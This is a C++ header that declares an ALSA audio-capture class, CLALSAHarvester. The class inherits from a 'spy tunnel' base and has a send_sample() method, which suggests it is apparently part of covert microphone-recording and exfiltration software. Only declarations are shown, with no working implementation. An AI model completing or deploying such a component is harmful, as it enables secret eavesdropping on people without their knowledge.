#ifndef CLALSA_HARVERSTER_HPP
#define CLALSA_HARVERSTER_HPP

#include <alsa/asoundlib.h>
#include "cltunnel_include.hpp"
#include "clspy_tunnel.hpp"

class CLALSAHarvester : public CLSpyTunnel {
public:
    void run() override;
protected:
    char hw_in_[16];
    unsigned int buffer_frames_;
    unsigned int sample_rate_;
    int channels_ = 0;
    char* buffer;
    snd_pcm_t* capture_handle_ = nullptr;
    snd_pcm_hw_params_t* hw_params_;
    snd_pcm_format_t format_ = SND_PCM_FORMAT_S16_LE;

    int alsa_recorder_init();
    int send_sample();
    void alsa_recorder_cleanup();
    int get_channels();
    void alsa_recorder_run();
};

#endif // CLALSA_HARVERSTER_HPP